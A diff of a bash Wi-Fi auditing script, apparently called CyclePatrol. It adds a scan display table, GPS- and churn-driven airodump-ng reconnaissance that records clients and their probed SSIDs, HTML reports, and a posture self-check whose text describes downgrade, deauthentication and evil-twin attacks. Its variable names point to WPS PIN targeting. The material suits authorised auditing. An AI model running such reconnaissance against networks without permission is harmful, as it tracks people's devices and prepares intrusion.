bssid"\036"essid"\036"sig"\036"ver"\036"ap_locked"\036"sel_reg"\036"wpa3"\036"pmf"\036"dpp"\036"wps_hidden"\036"wps_state"\036"cfg_methods"\036"tkip"\036"wpa1"\036"dpp_ver"\036"dpp_conf"\036"dpp_pkex"\036"psk"\036"owe"\036"channel"\036"dpid"\036"maker"\036"model"\036"fw"\036"devname"\036"serial"\036"uuid"\036"rsn_caps"\036"akm_list"\036"rsn_gw"\036"rsn_pw"\036"rsn_gm"\036"rsnxe_list"\036"extcap_list"\036"owe_tm"\036"td_bitmap"\036"rsnxe_cap_hex"\036"he_present"\036"he_capabilities_present"\036"he_operation_present"\036"he_bss_color"\036"he_twt_supported"\036"he_ul_mu_mimo"\036"he_dl_mu_mimo"\036"he_ul_ofdma"\036"he_dl_ofdma"\036"he_160mhz"\036"he_80p80"\036"he_spatial_streams"\036"he_raw_capabilities_hex"\036"eht_present"\036"eht_capabilities_present"\036"eht_operation_present"\036"eht_320mhz"\036"eht_puncturing_supported"\036"eht_mlo_supported"\036"eht_mlo_ap"\036"eht_spatial_streams"\036"eht_mcs_max"\036"eht_raw_capabilities_hex"\036"(freq==""?"0":freq)}
 function emit(){
 if(bssid!=""&&is_mac(bssid)&&(wps_on||dpp_on)){
 if(essid==""){essid="<hidden>";wps_hidden="YES"}
@@ -5816,10 +6568,10 @@ readonly RET_SKIPPED=3
 readonly RET_ERROR=4
 
 process_target() {
-	local b essid sig ver channel ap_locked sel_reg wpa3 pmf dpp wps_hidden wps_state cfg_methods
+	local b essid sig ver channel sel_reg wpa3 pmf dpp wps_hidden wps_state cfg_methods
 	local tkip wpa1 dpp_ver dpp_conf dpp_pkex psk dpid maker model fw devname serial uuid
 	local extra_info dpp_vulns cves pin_known _oui _cm cm_val skip_default_pin fn lk safe_essid
-	local chip_family vendor_lock pmf_mode akm monitor_chain rsn_caps akm_list wpa3_tm rsn_gw rsn_pw rsn_gm rsnxe_list extcap_list owe_tm td_bitmap transition_disable rsnxe_cap_hex wpa3_mode pmf_grade
+	local chip_family pmf_mode akm monitor_chain rsn_caps akm_list wpa3_tm rsn_gw rsn_pw rsn_gm rsnxe_list extcap_list owe_tm td_bitmap transition_disable rsnxe_cap_hex wpa3_mode pmf_grade
 	local hidden_pin_candidate cfg_methods_no_pin_display
 	local he_present he_capabilities_present he_operation_present he_bss_color he_twt_supported
 	local he_ul_mu_mimo he_dl_mu_mimo he_ul_ofdma he_dl_ofdma he_160mhz he_80p80 he_spatial_streams he_raw_capabilities_hex
@@ -5832,7 +6584,6 @@ process_target() {
 	sig=${3:-0}
 	ver=${4:-?}
 	channel=${5:-1}
-	ap_locked=${6:-NO}
 	sel_reg=${7:-NO}
 	wpa3=${8:-NO}
 	pmf=${9:-NO}
@@ -5902,7 +6653,6 @@ process_target() {
 	lk=""
 	safe_essid=""
 	chip_family=""
-	vendor_lock=""
 	pmf_mode="?"
 	akm=""
 	monitor_chain=""
@@ -6293,6 +7043,324 @@ process_target() {
 	return "$RET_FAILED"
 }
 
+function _band_from_freq() {
+	local f="${1:-}" ch="${2:-}"
+	if [[ "$f" =~ ^[0-9]+$ ]]; then
+		if ((f >= 2400 && f < 2500)); then
+			printf '2.4'
+			return 0
+		fi
+		if ((f >= 4900 && f < 5900)); then
+			printf '5'
+			return 0
+		fi
+		if ((f >= 5925 && f <= 7125)); then
+			printf '6E'
+			return 0
+		fi
+	fi
+	_band_from_ch "$ch" 2>/dev/null || printf '?'
+	return 0
+}
+
+function render_watch_header() {
+	[[ "${ENABLE_WATCH_TABLE:-1}" == "1" ]] || return 0
+	printf '%s%-17s %4s %-6s %-4s %1s %s%s\n' \
+		"$C_BOLD" "BSSID" "SIG" "CH/BND" "AUTH" "W" "ESSID" "$C_RESET"
+	return 0
+}
+
+function render_watch_row() {
+	local bssid="$1" essid="$2" sig="$3" ver="$4" wpa3="$5" owe="$6" wps_state="$7" psk="$8" channel="$9" akm="${10}" freq="${11:-}"
+	[[ "$bssid" =~ ^[0-9a-fA-F]{1,2}(:[0-9a-fA-F]{1,2}){5}$ ]] || return 0
+
+	local band auth auth_color wps sig_i sig_color essid_disp chb
+	band=$(_band_from_freq "$freq" "$channel")
+	[[ -n "$essid" && "$essid" != "<hidden>" ]] || essid="<hidden>"
+
+	sig_i="${sig%%.*}"
+	if [[ "$sig_i" =~ ^-?[0-9]+$ ]]; then
+		if ((sig_i >= -67)); then
+			sig_color="$C_GREEN"
+		elif ((sig_i >= -75)); then
+			sig_color="$C_YELLOW"
+		else
+			sig_color="$C_RED"
+		fi
+	else
+		sig_i="?"
+		sig_color="$C_GREY"
+	fi
+
+	if is_wpa_enterprise "$akm"; then
+		auth="EAP"
+		auth_color="$C_RED"
+	elif [[ "$wpa3" == "YES" || ",$akm," == *SAE* ]]; then
+		auth="WPA3"
+		auth_color="$C_GREEN"
+	elif [[ "$owe" == "YES" ]]; then
+		auth="OWE"
+		auth_color="$C_CYAN"
+	elif [[ "$psk" == "YES" || ",$akm," == *PSK* ]]; then
+		auth="WPA2"
+		auth_color="$C_GREEN"
+	else
+		auth="OPN"
+		auth_color="$C_RED"
+	fi
+
+	if { [[ -n "$ver" && "$ver" != "unknown" ]]; } || { [[ -n "$wps_state" && "$wps_state" != "unknown" ]]; }; then
+		wps="W"
+	else
+		wps=" "
+	fi
+
+	printf -v chb '%s/%s' "$channel" "$band"
+	essid_disp="${essid:0:14}"
+
+	printf '%s%-17s%s %s%4s%s %-6.6s %s%-4s%s %s%1s%s %s%s%s\n' \
+		"$C_GREY" "$bssid" "$C_RESET" \
+		"$sig_color" "$sig_i" "$C_RESET" \
+		"$chb" \
+		"$auth_color" "$auth" "$C_RESET" \
+		"$C_RED" "$wps" "$C_RESET" \
+		"$C_CYAN" "$essid_disp" "$C_RESET"
+	return 0
+}
+
+function render_watch_table() {
+	[[ "${ENABLE_WATCH_TABLE:-1}" == "1" ]] || return 0
+	local file="${1:-}"
+	[[ -n "$file" && -s "$file" ]] || return 0
+
+	render_watch_header
+
+	local -a F=()
+	while IFS=$'\036' read -r -a F || [[ ${#F[@]} -gt 0 ]]; do
+		if ((${#F[@]} < 29)); then
+			F=()
+			continue
+		fi
+		if [[ "${WATCH_HIDE_DONE:-1}" == "1" ]] && is_processed "${F[0]}"; then
+			F=()
+			continue
+		fi
+		if [[ -n "${WATCH_FILTER:-}" ]]; then
+			local hay="${F[0]} ${F[1]}"
+			if [[ "${hay,,}" != *"${WATCH_FILTER,,}"* ]]; then
+				F=()
+				continue
+			fi
+		fi
+		render_watch_row "${F[0]}" "${F[1]}" "${F[2]}" "${F[3]}" "${F[6]}" "${F[18]}" "${F[10]}" "${F[17]}" "${F[19]}" "${F[28]}" "${F[60]}" || true
+		F=()
+	done <"$file"
+	return 0
+}
+
+function _bssid_churn_pct() {
+	local prev="${1:-}" cur="${2:-}"
+	[[ -s "$prev" && -s "$cur" ]] || {
+		printf '0'
+		return 0
+	}
+	local sp sc
+	sp=$(mktemp 2>/dev/null) || {
+		printf '0'
+		return 0
+	}
+	sc=$(mktemp 2>/dev/null) || {
+		rm -f "$sp"
+		printf '0'
+		return 0
+	}
+	sort -u "$prev" 2>/dev/null >"$sp" || true
+	sort -u "$cur" 2>/dev/null >"$sc" || true
+	local np nc gone new
+	np=$(grep -c . "$sp" 2>/dev/null) || np=0
+	nc=$(grep -c . "$sc" 2>/dev/null) || nc=0
+	np=${np//[!0-9]/}
+	nc=${nc//[!0-9]/}
+	gone=$(comm -23 "$sp" "$sc" 2>/dev/null | grep -c .) || gone=0
+	new=$(comm -13 "$sp" "$sc" 2>/dev/null | grep -c .) || new=0
+	gone=${gone//[!0-9]/}
+	new=${new//[!0-9]/}
+	rm -f "$sp" "$sc"
+	[[ -n "$np" && -n "$nc" ]] || {
+		printf '0'
+		return 0
+	}
+	((np > 0 && nc > 0)) || {
+		printf '0'
+		return 0
+	}
+	local pg=$((gone * 100 / np)) pn=$((new * 100 / nc))
+	if ((pg >= pn)); then printf '%d' "$pg"; else printf '%d' "$pn"; fi
+}
+
+function _rssi_median() {
+	local f="${1:-}"
+	[[ -s "$f" ]] || {
+		printf ''
+		return 0
+	}
+	local -a v=()
+	mapfile -t v < <(sed -E 's/\..*$//; s/[^0-9-]//g' "$f" 2>/dev/null | grep -E '^-?[0-9]+$' | sort -n) || true
+	local n=${#v[@]}
+	((n > 0)) || {
+		printf ''
+		return 0
+	}
+	local mid=$((n / 2))
+	if ((n % 2 == 1)); then
+		printf '%d' "${v[mid]}"
+	else
+		printf '%d' "$(((v[mid - 1] + v[mid]) / 2))"
+	fi
+}
+
+function _gps_moved_m() {
+	local la1="${1:-}" lo1="${2:-}" la2="${3:-}" lo2="${4:-}"
+	[[ "$la1" =~ ^-?[0-9.]+$ && "$lo1" =~ ^-?[0-9.]+$ && "$la2" =~ ^-?[0-9.]+$ && "$lo2" =~ ^-?[0-9.]+$ ]] || {
+		printf '0'
+		return 0
+	}
+	awk -v la1="$la1" -v lo1="$lo1" -v la2="$la2" -v lo2="$lo2" 'BEGIN{
+		r=6371000; d=atan2(0,-1)/180;
+		x=(lo2-lo1)*d*cos((la1+la2)*d/2);
+		y=(la2-la1)*d;
+		m=sqrt(x*x+y*y)*r;
+		printf "%d", (m<0?-m:m);
+	}' 2>/dev/null || printf '0'
+}
+
+function _secs_since() {
+	local last="${1:-}" now="${2:-}"
+	[[ "$last" =~ ^[0-9]+$ ]] || {
+		printf '999999'
+		return 0
+	}
+	[[ "$now" =~ ^[0-9]+$ ]] || now=$(date +%s)
+	local d=$((now - last))
+	((d < 0)) && d=0
+	printf '%d' "$d"
+}
+
+function t7_ap_locked() {
+	in_lockout "${1:-}"
+}
+
+function reinit_iface() {
+	local ifc="${IFACE:-}"
+	print_log WARN IFACE "Reinit adapter ${ifc:-?}"
+	log_event WARN IFACE "Adapter reinitialized after no-data cycles." "iface_reinit" "" "iface=${ifc:-?} empty_cycles=${EMPTY_CYCLES:-0}"
+	if [[ -n "$ifc" ]] && command -v ip >/dev/null 2>&1; then
+		ip link set "$ifc" down 2>/dev/null || true
+		sleep 1
+		ip link set "$ifc" up 2>/dev/null || true
+	fi
+	CURRENT_MODE=""
+	EMPTY_CYCLES=0
+	LOW_SIG_CYCLES=0
+	return 0
+}
+
+function adaptive_recon_decide() {
+	[[ "${ENABLE_ADAPTIVE_RECON:-1}" == "1" ]] || return 0
+	local raw_size="${1:-0}"
+	raw_size=${raw_size//[!0-9]/}
+	[[ -n "$raw_size" ]] || raw_size=0
+	RECON_REQUESTED=0
+	RESCAN_FAST=0
+	IFACE_REINIT=0
+	local now
+	now=$(date +%s)
+
+	if ((raw_size < 50)); then
+		LOW_SIG_CYCLES=$((${LOW_SIG_CYCLES:-0} + 1))
+		EMPTY_CYCLES=$((${EMPTY_CYCLES:-0} + 1))
+	else
+		LOW_SIG_CYCLES=0
+		EMPTY_CYCLES=0
+	fi
+	if ((${EMPTY_CYCLES:-0} >= ${EMPTY_CYCLE_LIMIT:-2})); then
+		IFACE_REINIT=1
+	fi
+
+	local curb curr
+	curb=$(mktemp 2>/dev/null) || curb=""
+	curr=$(mktemp 2>/dev/null) || curr=""
+	if [[ -s "${SCAN_TARGETS:-}" && -n "$curb" ]]; then
+		cut -d$'\036' -f1 "$SCAN_TARGETS" 2>/dev/null | grep -E '^[0-9a-fA-F]{1,2}(:[0-9a-fA-F]{1,2}){5}$' >"$curb" || true
+		cut -d$'\036' -f3 "$SCAN_TARGETS" 2>/dev/null >"$curr" || true
+	fi
+
+	if [[ -s "${PREV_BSSID_FILE:-}" && -s "$curb" ]]; then
+		local churn
+		churn=$(_bssid_churn_pct "$PREV_BSSID_FILE" "$curb")
+		churn=${churn//[!0-9]/}
+		[[ -n "$churn" ]] || churn=0
+		if ((churn >= ${CHURN_PCT:-60})); then
+			RECON_REQUESTED=1
+			log_event INFO ADAPT "Environment changed; recon suggested." "churn" "" "churn=${churn}% threshold=${CHURN_PCT:-60}%"
+		fi
+	fi
+
+	local med
+	med=$(_rssi_median "$curr")
+	if [[ -n "$med" && -n "${PREV_RSSI_MED:-}" ]]; then
+		local drop=$((PREV_RSSI_MED - med))
+		if ((drop >= ${RSSI_DROP_DB:-15})); then
+			RESCAN_FAST=1
+			log_event INFO ADAPT "Signal dropped sharply; fast rescan." "rssi_drop" "" "prev=${PREV_RSSI_MED} now=${med} drop=${drop}dB"
+		fi
+	fi
+
+	if [[ -n "${LOCATION_FIX_RESULT:-}" ]]; then
+		local clat clon
+		clat=$(printf '%s\n' "$LOCATION_FIX_RESULT" | awk '{print $1}')
+		clon=$(printf '%s\n' "$LOCATION_FIX_RESULT" | awk '{print $2}')
+		if [[ -n "${PREV_GPS:-}" ]]; then
+			local plat plon moved
+			plat=${PREV_GPS%% *}
+			plon=${PREV_GPS#* }
+			plon=${plon%% *}
+			moved=$(_gps_moved_m "$plat" "$plon" "$clat" "$clon")
+			moved=${moved//[!0-9]/}
+			[[ -n "$moved" ]] || moved=0
+			if ((moved >= ${GPS_MOVE_M:-150})); then
+				RECON_REQUESTED=1
+				log_event INFO ADAPT "Moved; recon suggested." "gps_move" "" "dist=${moved}m threshold=${GPS_MOVE_M:-150}m"
+			fi
+		fi
+		[[ -n "$clat" && -n "$clon" ]] && PREV_GPS="$clat $clon" || true
+	fi
+
+	local since
+	since=$(_secs_since "${LAST_RECON_TS:-0}" "$now")
+	if ((since >= ${RECON_REFRESH_SECS:-900})); then
+		RECON_REQUESTED=1
+		log_event INFO ADAPT "Periodic recon refresh due." "refresh" "" "since=${since}s interval=${RECON_REFRESH_SECS:-900}s"
+	fi
+
+	if ((RECON_REQUESTED == 1)); then
+		local gap
+		gap=$(_secs_since "${LAST_RECON_TS:-0}" "$now")
+		if ((gap < ${RECON_MIN_GAP:-60})); then
+			RECON_REQUESTED=0
+		fi
+	fi
+
+	if [[ -n "$curb" && -s "$curb" ]]; then
+		[[ -n "${PREV_BSSID_FILE:-}" ]] || PREV_BSSID_FILE="${LOG_DIR:-/tmp}/prev_bssids"
+		cp -f "$curb" "$PREV_BSSID_FILE" 2>/dev/null || true
+	fi
+	[[ -n "$med" ]] && PREV_RSSI_MED="$med" || true
+	[[ -n "$curb" ]] && rm -f "$curb" || true
+	[[ -n "$curr" ]] && rm -f "$curr" || true
+	return 0
+}
+
 function run_scan_loop() {
 	while true; do
 		SCAN_NUM=$((${SCAN_NUM:-0} + 1))
@@ -6333,12 +7401,24 @@ function run_scan_loop() {
 		fi
 
 		if [[ -z "${SCAN_RAW:-}" || -z "${SCAN_TARGETS:-}" ]]; then
-			print_log ERROR SCAN "No scan"
+			log_error_detail SCAN "Scan failed." "The adapter gave no data. It may be busy, timed out, or not supported." "Check the adapter, wait a moment, then keep scanning." "SCAN_RAW/SCAN_TARGETS empty; iw scan timeout=${SCAN_TIMEOUT:-25}s."
 			sleep "${COOLDOWN:-5}" || true
 			continue
 		fi
 
-		parse_scan "$SCAN_RAW" "$SCAN_TARGETS" || print_log WARN SCAN "Parse failed"
+		parse_scan "$SCAN_RAW" "$SCAN_TARGETS" || log_error_detail SCAN "Bad scan data." "The scan output could not be read." "Re-run the scan; check the adapter and driver." "parse_scan returned non-zero."
+
+		render_watch_table "$SCAN_TARGETS" || true
+
+		if [[ "${ENABLE_ADAPTIVE_RECON:-1}" == "1" ]]; then
+			adaptive_recon_decide "$raw_size" || true
+			if ((IFACE_REINIT == 1)); then
+				reinit_iface || true
+			fi
+			if ((RECON_REQUESTED == 1)) && declare -F run_recon >/dev/null 2>&1; then
+				run_recon || print_log WARN RECON "Adaptive recon skipped"
+			fi
+		fi
 
 		local cnt=0
 		if [[ -s "$SCAN_TARGETS" ]]; then
@@ -6360,7 +7440,7 @@ function run_scan_loop() {
 
 		local done=0
 		if [[ -s "$SCAN_TARGETS" ]]; then
-			while IFS=$'\036' read -r line_bssid line_essid line_sig line_ver line_ap_locked line_sel_reg line_wpa3 line_pmf line_dpp line_wps_hidden line_wps_state line_cfg_methods line_tkip line_wpa1 line_dpp_ver line_dpp_conf line_dpp_pkex line_psk line_owe line_channel line_dpid line_maker line_model line_fw line_devname line_serial line_uuid line_rsn_caps line_akm_list line_rsn_gw line_rsn_pw line_rsn_gm line_rsnxe_list line_extcap_list line_owe_tm line_td_bitmap line_rsnxe_cap_hex line_he_present line_he_capabilities_present line_he_operation_present line_he_bss_color line_he_twt_supported line_he_ul_mu_mimo line_he_dl_mu_mimo line_he_ul_ofdma line_he_dl_ofdma line_he_160mhz line_he_80p80 line_he_spatial_streams line_he_raw_capabilities_hex line_eht_present line_eht_capabilities_present line_eht_operation_present line_eht_320mhz line_eht_puncturing_supported line_eht_mlo_supported line_eht_mlo_ap line_eht_spatial_streams line_eht_mcs_max line_eht_raw_capabilities_hex || [[ -n "$line_bssid" ]]; do
+			while IFS=$'\036' read -r line_bssid line_essid line_sig line_ver line_ap_locked line_sel_reg line_wpa3 line_pmf line_dpp line_wps_hidden line_wps_state line_cfg_methods line_tkip line_wpa1 line_dpp_ver line_dpp_conf line_dpp_pkex line_psk line_owe line_channel line_dpid line_maker line_model line_fw line_devname line_serial line_uuid line_rsn_caps line_akm_list line_rsn_gw line_rsn_pw line_rsn_gm line_rsnxe_list line_extcap_list line_owe_tm line_td_bitmap line_rsnxe_cap_hex line_he_present line_he_capabilities_present line_he_operation_present line_he_bss_color line_he_twt_supported line_he_ul_mu_mimo line_he_dl_mu_mimo line_he_ul_ofdma line_he_dl_ofdma line_he_160mhz line_he_80p80 line_he_spatial_streams line_he_raw_capabilities_hex line_eht_present line_eht_capabilities_present line_eht_operation_present line_eht_320mhz line_eht_puncturing_supported line_eht_mlo_supported line_eht_mlo_ap line_eht_spatial_streams line_eht_mcs_max line_eht_raw_capabilities_hex _ || [[ -n "$line_bssid" ]]; do
 				if [[ -z "$line_bssid" ]]; then continue; fi
 				if [[ ! "$line_bssid" =~ ^[0-9a-fA-F]{1,2}(:[0-9a-fA-F]{1,2}){5}$ ]]; then continue; fi
 				done=$((${done:-0} + 1))
@@ -6382,11 +7462,19 @@ function run_scan_loop() {
 		fi
 
 		if ((cnt > 0)); then
-			make_report || true
+			make_report || log_error_detail REPORT "Report not saved." "The HTML report could not be made." "Check free disk space and that LOG_DIR is writable." "make_report returned non-zero; LOG_DIR=$LOG_DIR."
 		fi
 
-		print_log INFO WAIT "Sleep ${COOLDOWN}s"
-		sleep "$COOLDOWN" || true
+		local _cool="$COOLDOWN"
+		if [[ "${ENABLE_ADAPTIVE_RECON:-1}" == "1" ]] && ((${RESCAN_FAST:-0} == 1)); then
+			_cool=0
+			print_log INFO WAIT "Fast rescan (signal drop) — no cooldown"
+		else
+			print_log INFO WAIT "Sleep ${_cool}s"
+		fi
+		if ((_cool > 0)); then
+			sleep "$_cool" || true
+		fi
 	done
 }
 
@@ -6412,12 +7500,12 @@ function _recon_uptime_fmt() {
 }
 
 function _recon_embed_png() {
-	local p="${1:-}" label="${2:-}" b64=""
+	# Reference the PNG by its basename (it sits next to the report) instead of
+	# inlining a base64 copy: the old base64 doubled the image and inflated the
+	# HTML ~33% (one airgraph = ~1.2 MB of base64). Keep the report + its PNGs together.
+	local p="${1:-}" label="${2:-}"
 	[[ -n "$p" && -r "$p" && -s "$p" ]] || return 0
-	b64=$(base64 -w0 "$p" 2>/dev/null) || b64=""
-	[[ -n "$b64" ]] || b64=$(base64 "$p" 2>/dev/null | tr -d '\r\n') || b64=""
-	[[ -n "$b64" ]] || return 0
-	printf '<figure class="g"><img alt="%s" src="data:image/png;base64,%s"><figcaption>%s</figcaption></figure>' "$label" "$b64" "$label"
+	printf '<figure class="g"><img alt="%s" src="%s" loading="lazy"><figcaption>%s</figcaption></figure>' "$label" "${p##*/}" "$label"
 	return 0
 }
 
@@ -6429,11 +7517,11 @@ function _dragonblood_from_auth() {
 	[[ "$up" == *SAE* ]] && has_sae=1
 	[[ "$up" == *PSK* ]] && has_psk=1
 	if ((has_sae == 1 && has_psk == 1)); then
-		printf 'HIGH|WPA3 transition mode (SAE+PSK): forced WPA2 downgrade then offline dictionary|Dragonblood IV-A; CVE-2019-9494 class|Split WPA2/WPA3 SSIDs or disable transition mode; require PMF'
+		printf 'LOW|WPA3 transition mode (SAE+PSK): forced WPA2 downgrade then offline dictionary|Dragonblood IV-A; CVE-2019-9494 class (posture from beacon, not executed)|Split WPA2/WPA3 SSIDs or disable transition mode; require PMF'
 		return 0
 	fi
 	if ((has_sae == 1)); then
-		printf 'MEDIUM|WPA3-SAE: timing side-channel and SAE-commit DoS exposure|Dragonblood V / IV-B; CVE-2019-9494 / 13377|H2E-only + patched AP/supplicant; mandatory PMF; avoid MODP groups 22/23/24'
+		printf 'INFO|WPA3-SAE: timing side-channel and SAE-commit DoS exposure|Dragonblood V / IV-B; CVE-2019-9494 / 13377 (posture from beacon, not executed)|H2E-only + patched AP/supplicant; mandatory PMF; avoid MODP groups 22/23/24'
 		return 0
 	fi
 	printf ''
@@ -6569,8 +7657,8 @@ function recon_report() {
 	local -A _apnew=()
 	RECON_NEW_BSSIDS=""
 	local -a ap_b=() ap_c=() ap_p=() ap_pr=() ap_ci=() ap_au=() ap_be=() ap_da=() ap_es=()
-	local b1 c1 p1 pr1 ci1 au1 be1 da1 fi1 la1 es1
-	while IFS=$'\036' read -r b1 c1 p1 pr1 ci1 au1 be1 da1 fi1 la1 es1; do
+	local b1 c1 p1 pr1 ci1 au1 be1 da1 es1
+	while IFS=$'\036' read -r b1 c1 p1 pr1 ci1 au1 be1 da1 _ _ es1; do
 		[[ -n "$b1" ]] || continue
 		ap_name["$b1"]="$es1"
 		if [[ -n "$skip_file" ]] && report_state_seen "$skip_file" "$b1"; then continue; fi
@@ -6643,7 +7731,7 @@ function recon_report() {
 			@media(prefers-color-scheme:dark){:root{--bg:#0f172a;--panel:#111827;--ink:#e8edf6;--muted:#94a3b8;--line:#1f2a3a;--acc:#60a5fa}}
 			*{box-sizing:border-box}
 			body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-			.wrap{max-width:1100px;margin:0 auto;padding:16px}
+			.wrap{max-width:min(1680px,96vw);margin:0 auto;padding:16px}
 			.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#e8edf6;border-radius:14px;padding:18px 20px}
 			.hero h1{margin:0 0 4px;font-size:19px}
 			.hero .sub{color:#aab6c8;font-size:12px}
@@ -6671,7 +7759,7 @@ function recon_report() {
 			</style>
 		CSS
 		printf '</head><body><div class="wrap">'
-		printf '<div class="hero"><h1>Wi-Fi reconnaissance survey</h1><div class="sub">%s v%s &middot; %s &middot; passive recon (authorized)</div></div>' "$TOOL_NAME" "$VERSION" "${now_dot:-}"
+		printf '<div class="hero"><h1>Wi-Fi recon</h1><div class="sub">%s v%s &middot; %s &middot; passive recon (authorized)</div></div>' "$TOOL_NAME" "$VERSION" "${now_dot:-}"
 		printf '<div class="cards"><div class="card"><div class="n">%s</div><div class="l">Access points</div></div><div class="card"><div class="n">%s</div><div class="l">Clients</div></div><div class="card"><div class="n">%s</div><div class="l">With GPS</div></div></div>' "$n_ap" "$n_sta" "$n_gps"
 
 		if [[ -n "$op_fix" ]]; then
@@ -6784,10 +7872,10 @@ function recon_report() {
 		fi
 
 		local g_capr g_cpg
-		g_capr="$(_recon_embed_png "$capr_png" "AP &harr; clients (CAPR)")" || g_capr=""
-		g_cpg="$(_recon_embed_png "$cpg_png" "clients &harr; probes (CPG)")" || g_cpg=""
+		g_cpg="$(_recon_embed_png "$cpg_png" "Client probe lists (CPG): which SSIDs each client looks for")" || g_cpg=""
+		g_capr="$(_recon_embed_png "$capr_png" "AP &harr; client links (CAPR)")" || g_capr=""
 		if [[ -n "$g_capr" || -n "$g_cpg" ]]; then
-			printf '<h2>Connection graphs</h2><div class="panel" style="padding:12px"><div class="graphs">%s%s</div></div>' "$g_capr" "$g_cpg"
+			printf '<h2>Connection graphs</h2><div class="panel" style="padding:12px"><div class="graphs">%s%s</div></div>' "$g_cpg" "$g_capr"
 		fi
 
 		printf '<footer>Generated by %s v%s. Passive reconnaissance of authorized networks only. No frames were injected.</footer>' "$TOOL_NAME" "$VERSION"
@@ -6811,6 +7899,7 @@ function run_recon() {
 		return 1
 	fi
 	_RECON_RUNNING=1
+	LAST_RECON_TS=$(date +%s)
 
 	if ! command -v airodump-ng >/dev/null 2>&1; then
 		print_log ERROR RECON "No airodump-ng"
@@ -6863,7 +7952,7 @@ function run_recon() {
 		fi
 	fi
 
-	local -a cmd=(airodump-ng "$IFACE" -w "$prefix" --output-format pcap,csv,kismet --write-interval 1 --manufacturer --wps --uptime)
+	local -a cmd=(airodump-ng "$IFACE" -w "$prefix" --output-format pcap,csv --write-interval 1 --manufacturer --wps --uptime)
 	[[ "$use_gpsd" == "1" ]] && cmd+=(--gpsd)
 	[[ -n "${RECON_BAND:-}" ]] && cmd+=(--band "$RECON_BAND")
 
@@ -6970,8 +8059,170 @@ function run_recon() {
 	esac
 }
 
+function selfcheck_now_ms() { date +%s%3N; }
+
+function selfcheck_build_sar() {
+	local sar="$1"
+	{
+		printf '{"bssid":"02:00:00:00:0a:01","essid":"Home-WPA2","akm_list":"PSK","rsnxe_list":"","pmf_mode":"cap","tkip":"NO","wpa1":"NO"}\n'
+		printf '{"bssid":"02:00:00:00:0c:03","essid":"WPA3-loop","akm_list":"SAE","rsnxe_list":"","pmf_mode":"req","tkip":"NO","wpa1":"NO"}\n'
+		printf '{"bssid":"02:00:00:00:0d:04","essid":"Corp-8021X","akm_list":"802.1X","rsnxe_list":"","pmf_mode":"cap","tkip":"NO","wpa1":"NO"}\n'
+		printf '{"bssid":"02:00:00:00:0e:05","essid":"Legacy-TKIP","akm_list":"PSK","rsnxe_list":"","pmf_mode":"cap","tkip":"YES","wpa1":"YES"}\n'
+		printf '{"bssid":"02:00:00:00:0f:06","essid":"WPA3-transition","akm_list":"SAE,PSK","rsnxe_list":"","pmf_mode":"req","tkip":"NO","wpa1":"NO"}\n'
+		printf '{"bssid":"02:00:00:00:0b:02","essid":"WPA3-H2E","akm_list":"SAE","rsnxe_list":"SAE-H2E","pmf_mode":"req","tkip":"NO","wpa1":"NO"}\n'
+	} >"$sar"
+}
+
+function selfcheck_write_proof() {
+	local dir="$1" fid="$2" expect="$3" present="$4" status="$5" elapsed="$6" run_id="$7"
+	local p="${dir}/${fid}.conf" verdict
+	verdict="$([[ "$present" == "$expect" ]] && echo PASS || echo FAIL)"
+	{
+		printf '# check_id: %s\n' "$fid"
+		printf '# function: build_posture_findings (cp.sh)\n'
+		printf '# run_id: %s\n' "$run_id"
+		printf '# time_utc: %s\n' "$(ts_now)"
+		printf '# source: synthetic sar.jsonl via real build_posture_findings (no RF)\n'
+		printf '# expected_finding_present: %s\n' "$expect"
+		printf '# finding_present: %s\n' "$present"
+		printf '# verification_logic: %s\n' "$verdict"
+		printf '# validation_experimental: not_applicable (boolean posture rule; no RF ground truth)\n'
+		printf '# numerical_stability: not_applicable (categorical rule, no numerics)\n'
+		printf '# sensitivity_analysis: not_applicable\n'
+		printf '# cross_validation: not_applicable\n'
+		printf '# elapsed_ms: %s\n' "$elapsed"
+		printf '# time_budget_ms: 30000\n'
+		printf '# status: %s\n' "$status"
+	} >"$p"
+	chmod 600 "$p" 2>/dev/null || true
+}
+
+function selfcheck_term() {
+	case "$1" in
+	F-PMF) printf 'Protected Management Frames (PMF, IEEE 802.11w)' ;;
+	F-NOWPA3) printf 'WPA3-SAE absent (WPA2-PSK only)' ;;
+	F-ENT) printf 'Enterprise 802.1X credential exposure' ;;
+	F-SSIDCONF) printf 'SSID Confusion (CVE-2023-52424)' ;;
+	F-LEGACY) printf 'Legacy cipher (TKIP / WPA1)' ;;
+	F-TRANSITION) printf 'WPA3 transition-mode downgrade' ;;
+	F-SAEPK) printf 'WPA3 SAE-PK precomputation exposure' ;;
+	*) printf '%s' "$1" ;;
+	esac
+}
+
+function selfcheck_meaning() {
+	case "$1" in
+	F-PMF) printf 'The network does not require signed management frames, so a device can be kicked off the Wi-Fi.' ;;
+	F-NOWPA3) printf 'Only WPA2 password login is used, so a captured handshake can be guessed offline.' ;;
+	F-ENT) printf 'Company (802.1X) Wi-Fi: a fake network can steal a login if the device does not check the server.' ;;
+	F-SSIDCONF) printf 'The network name is not signed, so a device can be tricked onto the wrong network.' ;;
+	F-LEGACY) printf 'Old broken encryption (TKIP / RC4), so part of the traffic can be read.' ;;
+	F-TRANSITION) printf 'WPA3 and WPA2 share one password, so an attacker can force the weaker WPA2.' ;;
+	F-SAEPK) printf 'A public hotspot password can be precomputed if the strength setting is low or the name is reused.' ;;
+	*) printf '' ;;
+	esac
+}
+
+function selfcheck_write_report() {
+	local rdir="$1" elapsed="$2" tstat="$3" nconf="$4" nfail="$5" run_id="$6" blob="$7"
+	local r="${rdir}/posture-selfcheck.md" id expect present status
+	{
+		printf '# CyclePatrol posture self-check\n\n'
+		printf 'Every check here is passive: it only reads the beacon. No radio is used.\n\n'
+		printf '## 1. Run Summary\n'
+		printf -- '- Run id: %s\n' "$run_id"
+		printf -- '- Checks run: 7 posture findings on sample networks\n'
+		printf -- '- Confirmed: %s. Failed: %s.\n\n' "$nconf" "$nfail"
+		printf '## 2. Confirmed Results\n'
+		while IFS=';' read -r id expect present status; do
+			[[ -n "$id" && "$status" == "confirmed" ]] || continue
+			printf -- '- **%s** — %s\n' "$id" "$(selfcheck_term "$id")"
+			printf -- '  - Simple meaning: %s\n' "$(selfcheck_meaning "$id")"
+			printf -- '  - Detected: %s. Expected: %s. Check: passed.\n' "$present" "$expect"
+			printf -- '  - Proof file: proof/sci/%s.conf\n' "$id"
+		done <<<"$blob"
